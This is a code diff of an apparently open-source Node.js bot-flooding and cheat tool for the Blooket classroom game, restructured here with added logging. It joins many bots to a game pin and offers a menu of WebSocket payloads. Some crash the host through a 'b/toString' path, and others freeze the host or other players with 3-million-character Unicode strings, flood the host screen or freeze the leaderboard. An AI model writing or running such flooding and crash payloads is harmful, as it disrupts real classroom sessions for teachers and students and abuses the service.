@@ -30,12 +30,12 @@ console.log(purple('  - 60-70% less resources used\n'));
 
 if (!process.env.PROXY) console.log(orange('⚠️  use a proxy for faster botting! see the README for more info\n'));
 
-const isOctober = new Date().getMonth() === 9;
-const isDecember = new Date().getMonth() === 11;
-const unrewritten = [isOctober ? 'Candy Quest' : 'Gold Quest', 'Crypto Hack', 'Fishing Frenzy'];
-if (isDecember) unrewritten.push('Santa\'s Workshop');
-
 try {
+    const isOctober = new Date().getMonth() === 9;
+    const isDecember = new Date().getMonth() === 11;
+    const unrewritten = [isOctober ? 'Candy Quest' : 'Gold Quest', 'Crypto Hack', 'Fishing Frenzy'];
+    if (isDecember) unrewritten.push('Santa\'s Workshop');
+
     const isUsingLegacy = await enquirer.prompt({
         type: 'select',
         name: 'is',
@@ -52,234 +52,237 @@ try {
         console.log('idrk what you just put so the program has quit run it again and type yes or no next time');
         process.exit(1);
     }
-} catch (err) {
-    console.error(red('Error during gamemode selection:'), err);
-    process.exit(1);
-}
 
-let config;
-try {
-    config = await enquirer.prompt([
+    const config = await enquirer.prompt([
         { type: 'input', name: 'pin', message: 'Game Pin' },
         { type: 'input', name: 'name', message: 'Bot Name' },
         { type: 'input', name: 'amount', message: 'Bot Amount' }
     ]);
-} catch (err) {
-    console.error(red('Error reading configuration:'), err);
-    process.exit(1);
-}
 
-console.log(yellow('\nverifying game pin...'));
+    console.log(yellow('\nverifying game pin...'));
 
-let redirectUrl;
-try {
-    const result = await cookieV2('https://play.blooket.com/play?id=' + config.pin, 'legacy1');
-    redirectUrl = result.redirectUrl;
-    if (!redirectUrl) throw new Error('No redirectUrl from cookieV2');
-} catch (err) {
-    console.log(red('Failed to verify game pin. Open an issue on Github if you believe this is an error.'));
-    console.error(err);
-    process.exit(1);
-}
-
-let mode = 'Unknown';
-for (const [key, value] of Object.entries({
-    cryptohack: 'Crypto Hack',
-    santasworkshop: 'Santa\'s Workshop',
-    goldquest: 'Gold Quest',
-    fishingfrenzy: 'Fishing Frenzy'
-})) {
-    if (redirectUrl.includes(key)) {
-        mode = value;
-        break;
-    }
-}
-
-console.log(green(`verified game pin! mode: ${mode}\n`));
-
-let success = 0;
-let fail = 0;
-const bots = [];
-
-for (let i = 1; i <= config.amount; i++) {
-    const botName = config.name + i;
-    console.log(`Joining bot ${botName}...`);
-    join(redirectUrl, config.pin, botName, (result, botObj) => {
-        if (result == 2) {
-            success++;
-            bots.push(botObj);
-            console.log(green(`✅ ${botName} joined successfully (${success}/${config.amount})`));
-        } else {
-            fail++;
-            console.log(red(`❌ ${botName} failed to join (${fail} failures)`));
-        }
-
-        if (success + fail == config.amount) {
-            console.log(green(`\n${success}/${config.amount} bots joined successfully!`));
-            // After all bots joined, ask to start the game
-            waitForGameStart(bots, mode);
-        }
-    });
-
-    // If no proxy, wait 300ms between joins
-    if (!process.env.PROXY) await new Promise((r) => setTimeout(r, 300));
-}
-
-async function waitForGameStart(bots, mode) {
-    console.log(yellow('\n--- All bots are now in the lobby ---'));
-    console.log(yellow('Please start the game on the host (click "Start Game" or equivalent).'));
-    console.log(yellow('Once the game has started, press Enter to continue to cheat selection.'));
-    await question('Press Enter when the game is running...');
-
-    // Now proceed to cheat selection
-    await askForCheats(bots, mode);
-}
-
-async function askForCheats(bots, mode) {
-    if (bots.length === 0) {
-        console.log(red('No bots successfully joined. Exiting.'));
+    const { redirectUrl } = await cookieV2('https://play.blooket.com/play?id=' + config.pin, 'legacy1');
+    if (!redirectUrl) {
+        console.log(red('Failed to verify game pin. Open an issue on Github if you believe this is an error.'));
         process.exit(1);
     }
 
-    console.log(yellow('\n--- Cheat Execution Menu ---'));
-    const useCheats = (await question('Do you want to execute a cheat using one of the bots? (Y/N): ')).toLowerCase();
-    if (useCheats !== 'y' && useCheats !== 'yes') {
-        console.log(yellow('No cheats selected. Exiting.'));
-        for (const bot of bots) bot.ws.close();
-        process.exit(0);
-    }
-
-    // Define cheats and their compatibility
-    const cheats = [
-        {
-            name: 'Freeze Leaderboard',
-            description: 'Prevents the host leaderboard from updating',
-            action: (bot) => bot.sendUpdate(`c/${bot.name}/tat/Freeze`, 'freeze'),
-            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
-        },
-        {
-            name: 'Crash Game',
-            description: 'Crashes the host\'s game',
-            action: (bot) => bot.sendUpdate(`c/${bot.name}/b/toString`, 'Crashed'),
-            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
-        },
-        {
-            name: 'Freeze Host',
-            description: 'Sends extremely long blook name to freeze host',
-            action: (bot) => {
-                const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
-                const unicodeChars = chars.map(c => eval(`"${c}"`));
-                const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
-                return bot.sendUpdate(`c/${bot.name}/b`, longText);
-            },
-            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
-        },
-        {
-            name: 'Set Blook Ad Text',
-            description: 'Sets your blook to repeated text',
-            inputs: [{ name: 'text', prompt: 'Enter text to repeat: ' }],
-            action: (bot, { text }) => {
-                const repeated = Array(500).fill(text).join(' ');
-                return bot.sendUpdate(`c/${bot.name}/b`, repeated);
-            },
-            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
-        },
-        {
-            name: 'Set Host Screen Green',
-            description: 'Fills host screen with text (Crypto Hack only)',
-            action: (bot) => {
-                const value = `9999999999999999999999999999999999999999999999${new Array(999).fill('\u0e47'.repeat(70)).join(' ')}`;
-                return bot.sendUpdate(`c/${bot.name}/cr`, value);
-            },
-            compatible: ['Crypto Hack']
-        },
-        {
-            name: 'Crash Password',
-            description: 'Crashes players who try to hack you (Crypto Hack only)',
-            action: (bot) => bot.sendUpdate(`c/${bot.name}/p/toString`, 'crash'),
-            compatible: ['Crypto Hack']
-        },
-        {
-            name: 'Freeze Password',
-            description: 'Freezes players who try to hack you (Crypto Hack only)',
-            action: (bot) => {
-                const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
-                const unicodeChars = chars.map(c => eval(`"${c}"`));
-                const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
-                return bot.sendUpdate(`c/${bot.name}/p`, longText);
-            },
-            compatible: ['Crypto Hack']
-        }
-    ];
-
-    // Filter cheats compatible with current mode
-    const availableCheats = cheats.filter(c => c.compatible.includes(mode));
-    if (availableCheats.length === 0) {
-        console.log(red(`No cheats available for mode: ${mode}`));
-        for (const bot of bots) bot.ws.close();
-        process.exit(0);
-    }
-
-    // Show cheat list with numbers
-    console.log(yellow('\nAvailable cheats:'));
-    for (let i = 0; i < availableCheats.length; i++) {
-        console.log(`${i + 1}. ${availableCheats[i].name} - ${availableCheats[i].description}`);
-    }
-
-    // Select cheat by number
-    let cheatIndex;
-    while (true) {
-        const ans = await question('Select a cheat (number): ');
-        const num = parseInt(ans.trim(), 10);
-        if (!isNaN(num) && num >= 1 && num <= availableCheats.length) {
-            cheatIndex = num - 1;
+    let mode = 'Unknown';
+    for (const [key, value] of Object.entries({
+        cryptohack: 'Crypto Hack',
+        santasworkshop: 'Santa\'s Workshop',
+        goldquest: 'Gold Quest',
+        fishingfrenzy: 'Fishing Frenzy'
+    })) {
+        if (redirectUrl.includes(key)) {
+            mode = value;
             break;
         }
-        console.log(red('Invalid number. Try again.'));
     }
-    const selectedCheat = availableCheats[cheatIndex];
 
-    // Collect any required parameters
-    let params = {};
-    if (selectedCheat.inputs) {
-        for (const inp of selectedCheat.inputs) {
-            const val = await question(inp.prompt);
-            params[inp.name] = val;
+    console.log(green(`verified game pin! mode: ${mode}\n`));
+
+    let success = 0;
+    let fail = 0;
+    const bots = [];
+
+    for (let i = 1; i <= config.amount; i++) {
+        join(redirectUrl, config.pin, config.name + i, (result, botObj) => {
+            if (result == 2) {
+                success++;
+                bots.push(botObj);
+            } else {
+                fail++;
+            }
+
+            if (success + fail == config.amount) {
+                console.log(green(`${success}/${config.amount} bots joined successfully!`));
+                waitForGameStart(bots, mode);
+            }
+        });
+
+        if (!process.env.PROXY) await new Promise((r) => setTimeout(r, 300));
+    }
+
+    async function waitForGameStart(bots, mode) {
+        console.log(yellow('\n--- All bots are now in the lobby ---'));
+        console.log(yellow('Please start the game on the host (click "Start Game" or equivalent).'));
+        await question('Once the game has started, press Enter to continue to cheat selection...');
+        askForCheats(bots, mode);
+    }
+
+    async function askForCheats(bots, mode) {
+        if (bots.length === 0) {
+            console.log(red('No bots successfully joined. Exiting.'));
+            process.exit(1);
         }
-    }
 
-    // Choose bot
-    console.log(yellow('\nBots:'));
-    bots.forEach((bot, idx) => console.log(`${idx + 1}. ${bot.name}`));
-    let botIndex;
-    while (true) {
-        const ans = await question('Select a bot (number): ');
-        const num = parseInt(ans.trim(), 10);
-        if (!isNaN(num) && num >= 1 && num <= bots.length) {
-            botIndex = num - 1;
-            break;
+        console.log(yellow('\n--- Cheat Execution Menu ---'));
+        const useCheats = (await question('Do you want to execute a cheat using one of the bots? (Y/N): ')).toLowerCase();
+        if (useCheats !== 'y' && useCheats !== 'yes') {
+            console.log(yellow('No cheats selected. Exiting.'));
+            for (const bot of bots) bot.ws.close();
+            process.exit(0);
         }
-        console.log(red('Invalid bot number. Try again.'));
-    }
-    const selectedBot = bots[botIndex];
 
-    // Execute cheat (now awaited)
-    console.log(yellow(`\nExecuting ${selectedCheat.name} on ${selectedBot.name}...`));
-    try {
-        await selectedCheat.action(selectedBot, params);
-        console.log(green('Cheat executed successfully!'));
-    } catch (err) {
-        console.log(red(`Cheat execution failed: ${err.message}`));
-    }
+        // Define cheats with diagnostic logging
+        const cheats = [
+            {
+                name: 'Freeze Leaderboard',
+                description: 'Prevents the host leaderboard from updating',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Sending freeze leaderboard...`);
+                    return bot.sendUpdate(`c/${bot.name}/tat/Freeze`, 'freeze');
+                },
+                compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
+            },
+            {
+                name: 'Crash Game (original path)',
+                description: 'Crashes the host via b/toString',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Sending crash via b/toString...`);
+                    return bot.sendUpdate(`c/${bot.name}/b/toString`, 'Crashed');
+                },
+                compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
+            },
+            {
+                name: 'Crash Game (alternative)',
+                description: 'Crashes the host via b (direct blook)',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Sending crash via b...`);
+                    return bot.sendUpdate(`c/${bot.name}/b`, 'Crashed');
+                },
+                compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
+            },
+            {
+                name: 'Freeze Host (large blook)',
+                description: 'Sends extremely long blook name to freeze host',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Generating long blook name (3M chars)...`);
+                    const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
+                    const unicodeChars = chars.map(c => eval(`"${c}"`));
+                    const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
+                    console.log(`[${bot.name}] Sending long text length: ${longText.length}`);
+                    return bot.sendUpdate(`c/${bot.name}/b`, longText);
+                },
+                compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
+            },
+            {
+                name: 'Set Blook Ad Text',
+                description: 'Sets your blook to repeated text',
+                inputs: [{ name: 'text', prompt: 'Enter text to repeat: ' }],
+                action: async (bot, { text }) => {
+                    const repeated = Array(500).fill(text).join(' ');
+                    console.log(`[${bot.name}] Sending ad text (length: ${repeated.length})...`);
+                    return bot.sendUpdate(`c/${bot.name}/b`, repeated);
+                },
+                compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
+            },
+            {
+                name: 'Set Host Screen Green (Crypto Hack)',
+                description: 'Fills host screen with text',
+                action: async (bot) => {
+                    const value = `9999999999999999999999999999999999999999999999${new Array(999).fill('\u0e47'.repeat(70)).join(' ')}`;
+                    console.log(`[${bot.name}] Sending host screen green (length: ${value.length})...`);
+                    return bot.sendUpdate(`c/${bot.name}/cr`, value);
+                },
+                compatible: ['Crypto Hack']
+            },
+            {
+                name: 'Crash Password (Crypto Hack)',
+                description: 'Crashes players who try to hack you',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Sending crash password...`);
+                    return bot.sendUpdate(`c/${bot.name}/p/toString`, 'crash');
+                },
+                compatible: ['Crypto Hack']
+            },
+            {
+                name: 'Freeze Password (Crypto Hack)',
+                description: 'Freezes players who try to hack you',
+                action: async (bot) => {
+                    console.log(`[${bot.name}] Sending freeze password...`);
+                    const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
+                    const unicodeChars = chars.map(c => eval(`"${c}"`));
+                    const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
+                    return bot.sendUpdate(`c/${bot.name}/p`, longText);
+                },
+                compatible: ['Crypto Hack']
+            }
+        ];
 
-    // Wait a moment to ensure the message is fully processed
-    console.log(yellow('Waiting 2 seconds for server to process...'));
-    await new Promise(resolve => setTimeout(resolve, 2000));
+        // Filter cheats compatible with current mode
+        const availableCheats = cheats.filter(c => c.compatible.includes(mode));
+        if (availableCheats.length === 0) {
+            console.log(red(`No cheats available for mode: ${mode}`));
+            for (const bot of bots) bot.ws.close();
+            process.exit(0);
+        }
 
-    // Close all bot WebSockets
-    for (const bot of bots) {
-        bot.ws.close();
+        // Show cheat list with numbers
+        console.log(yellow('\nAvailable cheats:'));
+        for (let i = 0; i < availableCheats.length; i++) {
+            console.log(`${i + 1}. ${availableCheats[i].name} - ${availableCheats[i].description}`);
+        }
+
+        // Select cheat by number
+        let cheatIndex;
+        while (true) {
+            const ans = await question('Select a cheat (number): ');
+            const num = parseInt(ans.trim(), 10);
+            if (!isNaN(num) && num >= 1 && num <= availableCheats.length) {
+                cheatIndex = num - 1;
+                break;
+            }
+            console.log(red('Invalid number. Try again.'));
+        }
+        const selectedCheat = availableCheats[cheatIndex];
+
+        // Collect any required parameters
+        let params = {};
+        if (selectedCheat.inputs) {
+            for (const inp of selectedCheat.inputs) {
+                const val = await question(inp.prompt);
+                params[inp.name] = val;
+            }
+        }
+
+        // Choose bot
+        console.log(yellow('\nBots:'));
+        bots.forEach((bot, idx) => console.log(`${idx + 1}. ${bot.name}`));
+        let botIndex;
+        while (true) {
+            const ans = await question('Select a bot (number): ');
+            const num = parseInt(ans.trim(), 10);
+            if (!isNaN(num) && num >= 1 && num <= bots.length) {
+                botIndex = num - 1;
+                break;
+            }
+            console.log(red('Invalid bot number. Try again.'));
+        }
+        const selectedBot = bots[botIndex];
+
+        // Execute cheat
+        console.log(yellow(`\nExecuting ${selectedCheat.name} on ${selectedBot.name}...`));
+        try {
+            await selectedCheat.action(selectedBot, params);
+            console.log(green('Cheat executed successfully!'));
+        } catch (err) {
+            console.log(red(`Cheat execution failed: ${err.message}`));
+            console.error(err);
+        }
+
+        // Wait a moment
+        console.log(yellow('Waiting 2 seconds for server to process...'));
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Close all bot WebSockets
+        for (const bot of bots) {
+            try { bot.ws.close(); } catch (e) { /* ignore */ }
+        }
+        process.exit(0);
     }
-    console.log(yellow('All connections closed. Exiting.'));
-    process.exit(0);
+} catch (error) {
+    console.error(red('An unexpected error occurred:'), error);
+    process.exit(1);
 }
